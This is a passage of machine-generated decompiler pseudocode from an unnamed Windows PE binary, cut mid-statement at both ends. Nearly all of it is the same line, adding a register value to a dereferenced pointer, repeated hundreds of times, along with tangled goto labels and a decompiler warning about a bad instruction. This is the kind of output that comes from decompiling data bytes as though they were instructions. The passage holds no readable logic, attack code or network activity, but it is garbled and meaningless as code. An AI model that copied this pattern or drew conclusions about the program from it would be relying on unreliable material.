uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        cVar14 = puVar43 >> 8;\n                        *(in_stack_0000009d + -0x66) = *(in_stack_0000009d + -0x66) + cVar14;\n                        while (uVar18 = *ppcVar26,  *ppcVar26 = *ppcVar26 + uVar17,  !CARRY1(uVar18, uVar17)) {\n                            while( true ) {\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                if (*ppcVar26 == '\\0') break;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                                *ppcVar26 = *ppcVar26 + uVar17;\n                            }\n                        }\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *puVar47 = *puVar47;\n                        *ppcVar26 = *ppcVar26 + uVar17;\n                        *(ppcVar26 + -0x67ffbaf7) = *(ppcVar26 + -0x67ffbaf7);\n                        puVar28 = uVar44 ^ *puVar47 ^ *puVar47 ^ *puVar47 ^ *puVar47 ^ *puVar47 ^ *puVar47 ^ *puVar47 ^\n                                  *puVar47 ^ *puVar47;\n                        uVar18 = puVar28;\n                        uVar34 = puVar43;\n                        cVar33 = in_stack_0000002d;\n                        in_stack_00000050 = in_SS;\n                        uVar17 = in_stack_00000050;\n                        in_stack_00000051 = in_SS >> 8;\n                        puVar38 = puVar47;\n                        if (puVar28 < 1) {\n                            if (0 < puVar28) goto code_r0x00466c3b;\n                            if (puVar28 < 1) {\n                                if (0 < puVar28) goto code_r0x00466c3f;\n                                pcVar21 = in_stack_0000002d + 0x339c0046 + puVar47;\n                                _pe_dos_header = in_CS;\n                                *pcVar21 = *pcVar21 + cVar33;\n                                pcVar21 = in_stack_0000002d + puVar47 + 0x339c0047;\n                                *pcVar21 = *pcVar21 + cVar33;\n                                *(in_stack_0000002d + puVar47 + 0xce70012) =\n                                     *(in_stack_0000002d + puVar47 + 0xce70012) + cVar33;\n                                puVar38 = puVar47 + 3;\n                                pcVar21 = in_stack_0000002d + 0x9900046 + puVar38;\n                                *pcVar21 = *pcVar21 + cVar33;\n                                *puVar28 = *puVar28 + uVar18;\n                                *puVar28 = *puVar28 + uVar18;\n                                *puVar28 = *puVar28 + uVar18;\n                                *puVar28 = *puVar28 + uVar18;\n                                *puVar28 = *puVar28 + uVar18;\n                                *puVar28 = *puVar28 + uVar18;\n                                *puVar43 = *puVar43 + uVar18;\n                                *puVar28 = *puVar28 + uVar18;\n                                *(puVar28 + -0x6dffbb72) = *(puVar28 + -0x6dffbb72) + uVar34;\n                                *(puVar28 + puVar43 + 0x4011) = *(puVar28 + puVar43 + 0x4011) + uVar34;\n                                *puVar28 = *puVar28 + uVar18;\n                                *puVar28 = *puVar28 + uVar18;\n                                *puVar43 = *puVar43 + uVar18;\n                                *puVar28 = *puVar28 + uVar18;\n                                *puVar43 = *puVar43 + uVar18;\n                                *puVar28 = *puVar28 + uVar18;\n                                *in_stack_0000002d = *in_stack_0000002d + uVar18;\n                                *puVar28 = *puVar28 + uVar18;\n                                *puVar43 = *puVar43 + uVar18;\n                                *puVar28 = *puVar28 + uVar18;\n                                *(puVar28 * 2) = *(puVar28 * 2) + uVar18;\n                                uVar16 = *puVar28;\n                                *puVar28 = *puVar28 + uVar18;\n                                *puVar28 = (*puVar28 - uVar18) - CARRY1(uVar16, uVar18);\n                                *puVar28 = *puVar28 + uVar18;\n                                puVar28 = puVar28 + 0x3400000;\n                                uVar16 = puVar28;\n                                *puVar28 = *puVar28 + uVar16;\n                                *puVar38 = *puVar38 + uVar16;\n                                *puVar28 = *puVar28 + uVar16;\n                                *puVar28 = *puVar28 + uVar16;\n                                *puVar49 = *puVar49 + uVar16;\n                                *puVar28 = *puVar28 + uVar16;\n                                *(puVar28 * 2) = *(puVar28 * 2);\n                                *puVar28 = *puVar28 + uVar16;\n                                *puVar28 = *puVar28 | uVar16;\n                                *puVar28 = *puVar28 + uVar16;\n                                goto code_r0x00466c3e;\n                            }\n                            *puVar28 = *puVar28 + uVar18;\ncode_r0x00466c3f:\n                            *puVar28 = *puVar28 + uVar18;\n                            *(puVar28 * 2) = *(puVar28 * 2);\n                            in_stack_00000050 = uVar16;\n                        }\n                        else {\n                            *puVar28 = *puVar28 + uVar18;\ncode_r0x00466c3b:\n                            *(puVar28 * 2) = *(puVar28 * 2);\n                            in_stack_00000050 = uVar16;\ncode_r0x00466c3e:\n                            *puVar28 = *puVar28 + puVar28;\n                            *puVar28 = *puVar28 | puVar28;\n                            *puVar28 = *puVar28 + puVar28;\n                        }\n                        *puVar28 = *puVar28 + puVar28;\n                        uVar18 = puVar28 | *puVar28;\n                        pcVar21 = puVar28 & 0xffffff00 | uVar18;\n                        *pcVar21 = *pcVar21 + uVar18;\n                        *pcVar21 = *pcVar21 + uVar18;\n                        *in_stack_0000002d = *in_stack_0000002d;\n                        *pcVar21 = *pcVar21 + uVar18;\n                        *pcVar21 = *pcVar21;\n                        *pcVar21 = *pcVar21 + uVar18;\n                        *(pcVar21 * 2) = *(pcVar21 * 2);\n                        *pcVar21 = *pcVar21 + uVar18;\n                        *pcVar21 = *pcVar21 + uVar18;\n                        *pcVar21 = *pcVar21 + uVar18;\n                        *puVar49 = *puVar49;\n                        *pcVar21 = *pcVar21 + uVar18;\n                        *puVar43 = *puVar43 + uVar18;\n                        *pcVar21 = *pcVar21 + uVar18;\n                        *pcVar21 = *pcVar21 + uVar34;\n                        *pcVar21 = *pcVar21 + uVar18;\n                        *pcVar21 = *pcVar21 + uVar18;\n                        *puVar43 = *puVar43 + uVar34;\n                        *pcVar21 = *pcVar21 + uVar18;\n                        *puVar43 = *puVar43 + uVar34;\n                        *pcVar21 = *pcVar21 + uVar18;\n                        *puVar43 = *puVar43 + uVar18;\n                        *pcVar21 = *pcVar21 + uVar18;\n                        _pe_dos_header = _pe_dos_header & 0xff00 | pe_dos_header + ((puVar28 & 0xffffff00) >> 8);\n                        *pcVar21 = *pcVar21 + uVar18;\n                        *pcVar21 = *pcVar21 + uVar18;\n                        *puVar43 = *puVar43 + uVar18;\n                        *pcVar21 = *pcVar21 + uVar18;\n                        _pe_dos_header = _pe_dos_header & 0xff00 | pe_dos_header + uVar18;\n                        *pcVar21 = *pcVar21 + uVar18;\n                        ppcVar26 = pcVar21 | 0x43000000;\n                        *ppcVar26 = *ppcVar26 + uVar18;\n                        *puVar43 = *puVar43 + uVar18;\n                        *ppcVar26 = *ppcVar26 + uVar18;\n                        *ppcVar26 = *ppcVar26 + uVar34;\n                        uVar16 = *ppcVar26;\n                        *ppcVar26 = *ppcVar26 + uVar18;\n                        *ppcVar26 = ppcVar26 + *ppcVar26 + CARRY1(uVar16, uVar18);\n                        *ppcVar26 = *ppcVar26 + uVar18;\n                        *ppcVar26 = *ppcVar26 + uVar18;\n                        *ppcVar26 = *ppcVar26 + uVar18;\n                        *ppcVar26 = *ppcVar26 + uVar18;\n                        *puVar38 = *puVar38 + uVar34;\n                        *ppcVar26 = *ppcVar26 + uVar18;\n                        _pe_dos_header = _pe_dos_header & 0xff00 | pe_dos_header + cVar33;\n                        *ppcVar26 = *ppcVar26 + uVar18;\n                        puVar29 = ppcVar26 | *ppcVar26;\n                        uVar18 = puVar29;\n                        *puVar29 = *puVar29 + uVar18;\n                        uVar5 = in(puVar43);\n                        *puVar49 = uVar5;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + (puVar29 >> 8);\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + cVar14;\n                        uVar16 = *puVar29;\n                        *puVar29 = *puVar29 + uVar18;\n                        uVar18 = uVar18 - CARRY1(uVar16, uVar18);\n                        puVar49 = puVar29 & 0xffffff00 | uVar18;\n                        *puVar49 = *puVar49 + uVar18;\n                        *puVar49 = *puVar49 + uVar18;\n                        *puVar49 = *puVar49 | puVar49;\n                        *puVar49 = *puVar49 + uVar18;\n                        in_stack_00000045 = in_stack_00000045 & 0xffffff | in_stack_00000050 << 0x18;\n                        *puVar49 = *puVar49 + uVar18;\n                        *puVar38 = *puVar38 + uVar34;\n                        *puVar49 = *puVar49 + uVar18;\n                        *(puVar49 + 0x2800000) = *(puVar49 + 0x2800000) + uVar18;\n                        *puVar49 = *puVar49 + uVar18;\n                        *(puVar37 + 0xa000001) = *(puVar37 + 0xa000001) + uVar18;\n                        *puVar49 = *puVar49 + uVar18;\n                        *(puVar43 + 0x2400000) = *(puVar43 + 0x2400000) + uVar18;\n                        *puVar49 = *puVar49 + uVar18;\n                        *(in_stack_0000002d + 0x5800000) = *(in_stack_0000002d + 0x5800000) + uVar18;\n                        *puVar49 = *puVar49 + uVar18;\n                        pcVar21 = puVar49 * 2 + 0xd0000;\n                        *pcVar21 = *pcVar21 + uVar18;\n                        *puVar49 = *puVar49 + uVar18;\n                        cVar39 = (puVar29 & 0xffffff00) >> 8;\n                        *puVar49 = *puVar49 + cVar39;\n                        *(puVar38 + 0x3400000) = *(puVar38 + 0x3400000) + cVar33;\n                        *(puVar49 + 0x800000) = *(puVar49 + 0x800000);\n                        *(puVar37 + 0xb0001) = *(puVar37 + 0xb0001);\n                        puVar38 = puVar38 + 1;\n                        *0xb7000000 = *0xb7000000 + uVar18;\n                        *puVar49 = *puVar49 + uVar34;\n                        uVar51 = CONCAT11(cVar14 + uVar18, uVar34);\n                        pcVar21 = puVar43 & 0xffff0000 | uVar51;\n                        *pcVar21 = *pcVar21;\n                        pcVar22 = in_stack_0000002d & 0xffff0000 | CONCAT11((in_stack_0000002d >> 8) + uVar34, cVar33);\n                        *pcVar22 = *pcVar22 + uVar18;\n                        _pe_dos_header = _pe_dos_header & 0xff00 | pe_dos_header + cVar33;\n                        *0x73 = *0x73 + -0x1a;\n                        *puVar38 = *puVar38 + cVar39;\n                        uVar44 = CONCAT11(-uVar15, uVar15 * -6 + 's') & 0xff0f;\n                        puVar29 = uVar44;\n                        uStack00000049 = SUB41(puVar38, 0);\n                        uStack0000004a = puVar38 >> 8;\n                        in_stack_0000004c = puVar43 & 0xffffff00 | puVar38 >> 0x18;\n                        uVar16 = uVar44;\n                        if (puVar49 + 1 < 0) {\n                            *puVar29 = *puVar29 + uVar16;\n                            *puVar29 = *puVar29 + uVar16;\n                            *puVar29 = *puVar29 + uVar16;\n                            *puVar29 = *puVar29 + uVar16;\n                            *puVar29 = *puVar29 + uVar16;\n                            *puVar29 = *puVar29 + uVar16;\n                            *puVar29 = *puVar29 + uVar16;\n                            *puVar29 = *puVar29 + uVar16;\n                            *puVar29 = *puVar29 + uVar16;\n                            *puVar29 = *puVar29 + uVar16;\n                        }\n                        else if (!SCARRY4(puVar49, 1)) {\n                            puVar30 = puVar29 + 2;\n                            cVar14 = puVar30;\n                            *pcVar21 = *pcVar21 + cVar14;\n                            *puVar30 = *puVar30 + cVar14;\n                            puVar29[-0x5d] = puVar29[-0x5d] + cVar14;\n                            *puVar30 = *puVar30 + (uVar51 >> 8);\n                            piVar32 = *0x40044;\n                            **0x40044 = **0x40044 + *0x40044;\n                            pcVar21 = piVar32 + *piVar32;\n                            cVar14 = pcVar21;\n                            *pcVar21 = *pcVar21 + cVar14;\n                            *pcVar21 = *pcVar21 + cVar14;\n                            *pcVar21 = *pcVar21 + cVar14;\n                            *pcVar21 = *pcVar21 + cVar14;\n                            *pcVar21 = *pcVar21 + cVar14;\n                            *pcVar21 = *pcVar21 + cVar14;\n                            *pcVar21 = *pcVar21 + cVar14;\n    // WARNING: Bad instruction - Truncating control flow here\n                            halt_baddata();\n                        }\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        uVar15 = *puVar29;\n                        *puVar29 = *puVar29 + uVar16;\n                        bVar54 = CARRY1(*puVar29, uVar34) || CARRY1(*puVar29 + uVar34, CARRY1(uVar15, uVar16));\n                        *puVar29 = *puVar29 + uVar34 + CARRY1(uVar15, uVar16);\n                        bVar53 = CARRY1(*puVar29, uVar34) || CARRY1(*puVar29 + uVar34, bVar54);\n                        *puVar29 = *puVar29 + uVar34 + bVar54;\n                        bVar54 = CARRY1(*puVar29, uVar34) || CARRY1(*puVar29 + uVar34, bVar53);\n                        *puVar29 = *puVar29 + uVar34 + bVar53;\n                        bVar53 = CARRY1(*puVar29, uVar34) || CARRY1(*puVar29 + uVar34, bVar54);\n                        *puVar29 = *puVar29 + uVar34 + bVar54;\n                        bVar54 = CARRY1(*puVar29, uVar34) || CARRY1(*puVar29 + uVar34, bVar53);\n                        *puVar29 = *puVar29 + uVar34 + bVar53;\n                        bVar53 = CARRY1(*puVar29, uVar34) || CARRY1(*puVar29 + uVar34, bVar54);\n                        *puVar29 = *puVar29 + uVar34 + bVar54;\n                        bVar54 = CARRY1(*puVar29, uVar34) || CARRY1(*puVar29 + uVar34, bVar53);\n                        *puVar29 = *puVar29 + uVar34 + bVar53;\n                        bVar53 = CARRY1(*puVar29, uVar34) || CARRY1(*puVar29 + uVar34, bVar54);\n                        *puVar29 = *puVar29 + uVar34 + bVar54;\n                        bVar54 = CARRY1(*puVar29, uVar34) || CARRY1(*puVar29 + uVar34, bVar53);\n                        *puVar29 = *puVar29 + uVar34 + bVar53;\n                        bVar53 = CARRY1(*puVar29, uVar34) || CARRY1(*puVar29 + uVar34, bVar54);\n                        *puVar29 = *puVar29 + uVar34 + bVar54;\n                        bVar54 = CARRY1(*puVar29, uVar34) || CARRY1(*puVar29 + uVar34, bVar53);\n                        *puVar29 = *puVar29 + uVar34 + bVar53;\n                        uVar15 = *puVar29;\n                        uVar18 = *puVar29;\n                        *puVar29 = uVar18 + uVar34 + bVar54;\n                        *puVar29 = *puVar29 + uVar34 + (CARRY1(uVar15, uVar34) || CARRY1(uVar18 + uVar34, bVar54));\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        uVar15 = puVar29 >> 8;\n                        *puVar29 = *puVar29 & uVar15;\n                        *puVar29 = *puVar29 & uVar15;\n                        *puVar29 = *puVar29 & uVar15;\n                        *puVar29 = *puVar29 & uVar15;\n                        *puVar29 = *puVar29 & uVar15;\n                        *puVar29 = *puVar29 & uVar15;\n                        *puVar29 = *puVar29 & uVar15;\n                        *puVar29 = *puVar29 & uVar15;\n                        *puVar29 = *puVar29 & uVar15;\n                        *puVar29 = *puVar29 & uVar15;\n                        *puVar29 = *puVar29 & uVar15;\n                        *puVar29 = *puVar29 & uVar15;\n                        *puVar29 = *puVar29 & uVar15;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        *puVar29 = *puVar29 + uVar16;\n                        uVar16 = *puVar29;\n                        uVar15 = *puVar29;\n                        Stack0000004d = (puVar43 & 0xffffff00) >> 8;\n                        puVar31 = CONCAT13(uVar17, Stack0000004d);\n                        puVar25 = CONCAT13(in_stack_00000054, \n                                           CONCAT12(in_stack_00000053, CONCAT11(in_stack_00000052, in_stack_00000051)));\n                        Stack0000005d = uVar19 >> 8;\n                        pcVar21 = CONCAT13(in_stack_00000064, Stack00000061);\n                        uVar51 = CONCAT13(in_stack_00000068, CONCAT12(in_stack_00000067, in_stack_00000065));\n                        puVar29 = CONCAT13(in_stack_0000006c, \n                                           CONCAT12(in_stack_0000006b, CONCAT11(in_stack_0000006a, in_stack_00000069)));\n                        puVar45 = &stack0x0000006d & 0xffff0000 | iVar6 + 0x6bU;\n                        puVar52 = segment(in_SS, iVar6 + 0x6bU);\n                        *puVar52 = 0x6a69;\n                        iVar8 = *((puVar47 & 0xff000000 | CONCAT12(in_stack_00000057, in_stack_00000055)) * 3 + 0x6e) *\n                                0x6f;\n                        iVar24 = iVar8;\n                        bVar54 = iVar24 != iVar8;\n                        if (bVar54) {\ncode_r0x00466f90:\n                            *puVar29 = *puVar29 + puVar29;\n                            *puVar29 = *puVar29 + puVar29;\ncode_r0x00466f94:\n                            *puVar29 = *puVar29 + puVar29;\n                            *puVar29 = *puVar29 + puVar29;\ncode_r0x00466f98:\n                            *puVar29 = *puVar29 + puVar29;\n                            *puVar29 = *puVar29 + puVar29;\n                        }\n                        else {\n                            if (bVar54) goto code_r0x00466f94;\n                            if (uVar15 == 0) goto code_r0x00466f98;\n                            if (!bVar54 && uVar15 != 0) {\n                                if (uVar16 < '\\0') goto code_r0x00466fa0;\n                                *puVar29 = *puVar29 + in_stack_00000069;\n                                *puVar29 = *puVar29 + in_stack_00000069;\n                                *(uVar51 + 0x42) = *(uVar51 + 0x42) + in_stack_00000069;\n                                *(puVar45 + -4) = puVar29 + -1;\n                                *(puVar45 + -8) = uVar51 - 1;\n                                *(puVar45 + -0xc) = pcVar21 + -1;\n                                *(puVar45 + -0x10) = CONCAT13(uStack00000060, Stack0000005d);\n                                *(puVar45 + -0x14) = puVar45 + -0x10;\n                                *(puVar45 + -0x18) = iVar24;\n                                *(puVar45 + -0x1c) = puVar25;\n                                *(puVar45 + -0x20) = puVar31;\n                                puVar29 = *(puVar45 + -0x20);\n                                uVar51 = *(puVar45 + -0x1c);\n                                pcVar21 = *(puVar45 + -0x18);\n                                puVar45 = puVar45 + -0x14;\n                                cVar14 = puVar29;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                *puVar29 = *puVar29 + cVar14;\n                                goto code_r0x00466f90;\n                            }\n                        }\n                        *puVar29 = *puVar29 + puVar29;\n                        *puVar29 = *puVar29 + puVar29;\ncode_r0x00466fa0:\n                        uVar55 = CONCAT44(pcVar21, puVar29);\n                        uVar18 = puVar29;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 = *puVar29 + uVar18;\n                        *puVar29 